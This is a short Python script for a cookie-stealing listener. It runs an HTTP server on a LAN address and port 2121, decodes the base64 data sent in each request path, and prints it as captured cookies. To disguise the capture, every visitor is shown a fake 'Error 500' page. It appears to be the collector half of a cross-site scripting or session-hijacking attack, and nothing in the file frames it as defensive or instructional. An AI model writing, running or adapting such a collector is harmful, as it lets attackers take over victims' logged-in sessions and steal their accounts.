# Python 3 server example
from http.server import BaseHTTPRequestHandler, HTTPServer
import time
import base64

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[46m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


hostName = "192.168.1.145"
serverPort = 2121

class MyServer(BaseHTTPRequestHandler):
	def parseCoockie(self):
        	return base64.b64decode(self.path[1:].replace("%3D","=")).decode()

	def do_GET(self):
		self.send_response(200)
		self.send_header("Content-type", "text/html")
		self.end_headers()
		self.wfile.write(bytes("<html><head><title>ERROR</title></head>", "utf-8"))
		self.wfile.write(bytes("<body>", "utf-8"))
		self.wfile.write(bytes("<h2>Error 500</h2>", "utf-8"))
		self.wfile.write(bytes("</body></html>", "utf-8"))
		print(bcolors.BOLD + bcolors.HEADER + "[+] LA COOKIES: " + self.parseCoockie() + bcolors.ENDC)


if __name__ == "__main__":
	webServer = HTTPServer((hostName, serverPort), MyServer)
	print("Server started http://%s:%s" % (hostName, serverPort))

	try:
		webServer.serve_forever()
	except KeyboardInterrupt:
		pass

	webServer.server_close()
	print("Server stopped.")
